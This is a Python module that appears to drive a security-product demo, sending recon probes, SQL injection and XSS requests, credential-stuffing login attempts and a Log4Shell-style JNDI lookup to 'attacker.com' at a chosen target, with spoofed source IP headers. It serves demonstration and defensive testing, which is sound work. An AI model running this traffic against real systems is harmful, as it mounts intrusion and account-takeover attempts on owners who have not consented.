"""
scenarios.py — Executes each attack scenario against the target URL.
Each scenario maps to a story chapter in your demo.
"""

import random
import time

import requests
from requests.exceptions import RequestException

from attacks.payloads import PAYLOADS

# ── Volume settings — tweak request counts here ──────────────────────────────
VOLUME_MAP = {
    "low":    {"count": 40,  "delay_min": 0.2, "delay_max": 0.8},
    "medium": {"count": 150, "delay_min": 0.1, "delay_max": 0.4},
    "high":   {"count": 400, "delay_min": 0.05, "delay_max": 0.2},
}

# Realistic-looking source IPs (spoofed in X-Forwarded-For header)
FAKE_IPS = [
    "185.220.101.47",  # Known Tor exit node range
    "194.165.16.72",   # Eastern Europe
    "103.21.244.0",    # Asia Pacific
    "45.142.212.100",  # Russia
    "162.247.74.27",   # US Tor
    "91.108.4.0",      # Telegram/bot range
    "198.144.121.93",
    "212.102.63.0",
]


def _send(url, method="GET", params=None, data=None, headers=None, log_queue=None, label=""):
    """
    Fire one HTTP request and push the result to the log queue.
    Returns the response status code, or 0 on connection error.
    """
    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "X-Forwarded-For": random.choice(FAKE_IPS),
        "X-Real-IP": random.choice(FAKE_IPS),
    }
    if headers:
        base_headers.update(headers)

    try:
        if method == "POST":
            resp = requests.post(url, data=data, headers=base_headers,
                                 timeout=8, allow_redirects=False, verify=False)
        else:
            resp = requests.get(url, params=params, headers=base_headers,
                                timeout=8, allow_redirects=False, verify=False)

        status  = resp.status_code
        blocked = status in (403, 429, 444)

        if log_queue:
            log_queue.put({
                "type":    "blocked" if blocked else "passed",
                "method":  method,
                "url":     url,
                "status":  status,
                "blocked": blocked,
                "label":   label or (str(params or data or "")[:80]),
                "ip":      base_headers["X-Forwarded-For"],
            })
        return status

    except RequestException as exc:
        if log_queue:
            log_queue.put({
                "type":    "error",
                "method":  method,
                "url":     url,
                "status":  0,
                "blocked": False,
                "label":   f"Connection error: {exc}",
                "ip":      base_headers.get("X-Forwarded-For", ""),
            })
        return 0


def _sleep(cfg):
    time.sleep(random.uniform(cfg["delay_min"], cfg["delay_max"]))


# ── Scenario 1: Reconnaissance ───────────────────────────────────────────────

def run_recon(count, cfg, target, log_queue):
    log_queue.put({"type": "phase", "message": "🔍 Phase 1 — Reconnaissance: attacker mapping the environment"})

    paths  = PAYLOADS["recon_paths"]
    agents = PAYLOADS["scanner_agents"]

    for _ in range(count):
        path  = random.choice(paths)
        agent = random.choice(agents)
        _send(
            url=f"{target}{path}",
            headers={"User-Agent": agent},
            label=f"Recon → {path}",
            log_queue=log_queue,
        )
        _sleep(cfg)

    log_queue.put({"type": "phase_end", "message": f"Recon complete — {count} probe requests fired"})


# ── Scenario 2: SQL Injection ────────────────────────────────────────────────

def run_sqli(count, cfg, target, log_queue):
    log_queue.put({"type": "phase", "message": "💉 Phase 2 — SQL Injection: targeting customer database"})

    endpoints = [
        "/dvwa/vulnerabilities/sqli/",
        "/search", "/login", "/user", "/products",
        "/api/v1/users", "/api/v1/search",
    ]
    payloads = PAYLOADS["sqli"] + PAYLOADS["xss"]

    for _ in range(count):
        endpoint = random.choice(endpoints)
        payload  = random.choice(payloads)
        _send(
            url=f"{target}{endpoint}",
            params={"id": payload, "q": payload, "search": payload},
            label=f"SQLi → {payload[:60]}",
            log_queue=log_queue,
        )
        _sleep(cfg)

    log_queue.put({"type": "phase_end", "message": f"SQLi complete — {count} injection attempts fired"})


# ── Scenario 3: Credential Stuffing ─────────────────────────────────────────

def run_credential_stuffing(count, cfg, target, log_queue):
    log_queue.put({"type": "phase", "message": "🔐 Phase 3 — Credential Stuffing: targeting employee accounts"})

    usernames = PAYLOADS["usernames"]
    passwords = PAYLOADS["passwords"]
    endpoints = ["/dvwa/login.php", "/login", "/wp-login.php", "/admin/login", "/api/auth"]

    for _ in range(count):
        endpoint = random.choice(endpoints)
        _send(
            url=f"{target}{endpoint}",
            method="POST",
            data={
                "username": random.choice(usernames),
                "password": random.choice(passwords),
                "Login":    "Login",
            },
            label=f"Stuffing → {endpoint}",
            log_queue=log_queue,
        )
        _sleep(cfg)

    log_queue.put({"type": "phase_end", "message": f"Credential stuffing complete — {count} login attempts fired"})


# ── Scenario 4: Zero-Day / CVE Exploitation ──────────────────────────────────

def run_zero_day(count, cfg, target, log_queue):
    log_queue.put({"type": "phase", "message": "💥 Phase 4 — Zero-Day Exploitation: nation-state level attack"})

    endpoints = [
        "/api/v1/users", "/actuator/env", "/admin",
        "/app", "/$%7Bjndi:ldap://attacker.com%7D",
    ]
    cve_payloads = PAYLOADS["zero_day"]

    for _ in range(count):
        cve      = random.choice(cve_payloads)
        endpoint = random.choice(endpoints)
        _send(
            url=f"{target}{endpoint}",
            headers={
                "User-Agent":   cve["ua"],
                "X-Api-Version": cve["header_value"],
                "X-Forwarded-For": random.choice(FAKE_IPS),
                "Referer":      f"{target}/vulnerable-page",
            },
            label=f"{cve['label']} → {endpoint}",
            log_queue=log_queue,
        )
        _sleep(cfg)

    log_queue.put({"type": "phase_end", "message": f"Zero-day complete — {count} exploit attempts fired"})


# ── Scenario 5: Full Campaign (all phases in sequence) ───────────────────────

def run_full_campaign(count, cfg, target, log_queue):
    log_queue.put({"type": "phase", "message": "🎯 Full Campaign — all phases firing in sequence"})

    chunk = max(count // 4, 10)  # Split evenly across 4 phases

    run_recon(chunk, cfg, target, log_queue)
    time.sleep(3)
    run_sqli(chunk, cfg, target, log_queue)
    time.sleep(3)
    run_credential_stuffing(chunk, cfg, target, log_queue)
    time.sleep(3)
    run_zero_day(chunk, cfg, target, log_queue)

    log_queue.put({"type": "phase", "message": "🏁 Full campaign complete — check your consoles"})


# ── Router ───────────────────────────────────────────────────────────────────

SCENARIO_MAP = {
    "recon":               run_recon,
    "sqli":                run_sqli,
    "credential_stuffing": run_credential_stuffing,
    "zero_day":            run_zero_day,
    "full_campaign":       run_full_campaign,
}


def run_scenario(scenario: str, volume: str, target: str, log_queue):
    """Entry point called by app.py."""
    cfg   = VOLUME_MAP.get(volume, VOLUME_MAP["low"])
    count = cfg["count"]
    func  = SCENARIO_MAP.get(scenario, run_recon)

    # Full campaign handles its own chunking
    if scenario == "full_campaign":
        func(count, cfg, target, log_queue)
    else:
        func(count, cfg, target, log_queue)
